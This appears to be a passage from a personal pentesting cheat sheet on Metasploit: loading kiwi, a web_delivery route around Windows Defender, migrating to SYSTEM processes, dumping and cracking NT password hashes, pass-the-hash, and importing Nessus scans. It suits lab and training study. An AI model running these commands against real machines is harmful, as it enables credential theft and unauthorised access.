------
Payloads
------

You can load modules with `load`

```bash
# python kiwi powershell...
meterpreter > load kiwi
```

<details class="details-e">
<summary>Note: Windows defender</summary>

It's highly likely that the machine is running Windows defender. You may try to use others payloads, such as `exploit/multi/script/web_delivery`.

* set the target (ex: powershell)
* ...
* run
* paste the prompt in the terminal you want to exploit
* done?
</details>

<details class="details-e">
<summary>Note: SSL</summary>

I had to do that once, I don't remember why ðŸ’¥

* Add the `hostname` to `/etc/hosts` (use nano/...)
* In meterpreter, set SSL to true
* run
</details>

</div></div>

<hr class="sep-both">

## Not-admin yet

<div class="row row-cols-md-2"><div>

To access a service, we need to be "in" a process that has the same architecture, and the same permissions, that our target. **Usually**, any process run by "NT AUTHORITY\SYSTEM" (root) should be okay, although you may have to try a few times.

```bash
meterpreter > ps # list process
meterpreter > migrate process_pid # move to another process
meterpreter > migrate -N process_name # same
```
</div><div>
</div></div>

<hr class="sep-both">

## As an admin

<div class="row row-cols-md-2"><div>

Dump every username/password store by the system, they are hashed, you need to use `john` with `format=nt` to try bruteforce NTML hashes. It's worth noting that you can use the [hash to login using psexec](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/).

```bash
meterpreter > hashdump
# You may try to crack them using john within the msfconsole
msf6 exploit('module_used') > use auxiliary/analyze/crack_windows
msf6 exploit('module_used') > set CUSTOM_WORDLIST /usr/share/wordlists/rockyou.txt
msf6 exploit('module_used') > run
```
</div><div>

</div></div>

<hr class="sep-both">

## msfconsole, and nessus

<div class="row row-cols-md-2"><div>

To be honest, it was way more useful to explore results in nessus web interface, but if you don't have one, then this is surely something useful.

![nessus_exploit_with](_images/nessus_exploit_with.png)

First, start a msf database

```bash
$ sudo systemctl start postgresql
$ sudo msfdb init
# I got some errors, but it still works
```

Then in your msfconsole

```bash
$ msfconsole -q
msf6 > db_status # check if connected
[*] Connected to msf. Connection type: postgresql.
```
</div><div>

Everything below is coming from [this tutorial](https://scubarda.com/2015/11/16/launching-nessus-scans-inside-metasploit/), but metasploit unleashed has also [some tips](https://www.offensive-security.com/metasploit-unleashed/working-with-nessus/).

```bash
msf6 > load nessus
# Connect
msf6 > nessus_connect user:pass@localhost:8834
# List the scans that you did
msf6 > nessus_scan_list
# Import the result of a scan
msf6 > nessus_db_import id_you_found_in_the_list
```

Once you did, there a few commands you can use

* `services`: see what services the target run
* `vulns`: see vulnerabilities
* `vulns -s ftp`: see ftp vulnerabilities
* `vulns -S keyword`: see vulnerabilities including keyword
* `search cve:2010-2075`: search CVE

Then, process as usual.
</div></div>